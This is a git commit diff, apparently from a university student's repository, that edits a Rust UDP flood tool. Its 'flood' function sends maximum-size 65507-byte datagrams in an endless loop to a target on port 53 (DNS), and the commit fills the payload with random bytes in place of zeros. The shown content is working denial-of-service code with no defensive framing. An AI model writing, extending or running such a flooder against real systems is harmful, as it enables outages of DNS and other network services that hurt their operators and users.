33e470ebea51c70eb0f74b1e7e6bd855af1feaa4
thomas.campistron.etu <thomas.campistron.etu@univ-lille.fr>
2019-02-11 12:46:16 +0100

    randomize the buffer

--- rust/src/main.rs
+++ rust/src/main.rs
@@ -1,14 +1,20 @@
 use std::net::UdpSocket;
+use rand::Rng;
 use std::env;
 
 // const ADDR: String = "localhost";
 const PORT: u32 = 53;
 const NB_THREADS: u32 = 1;
 
+const BUF_SIZE: usize = 65507;
+
 fn flood(addr: String, port: u32) {
+    let mut buf = [0 as u8; BUF_SIZE];
+    let mut rng = rand::thread_rng();
+    for i in 0..BUF_SIZE { buf[i] = rng.gen() };
+
     loop {
         let src = format!("{}:{}", addr, port);
-        let buf = [0; 65507]; // TODO RANDOMIZE
         let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
 
         socket.send_to(&buf, &src).unwrap();
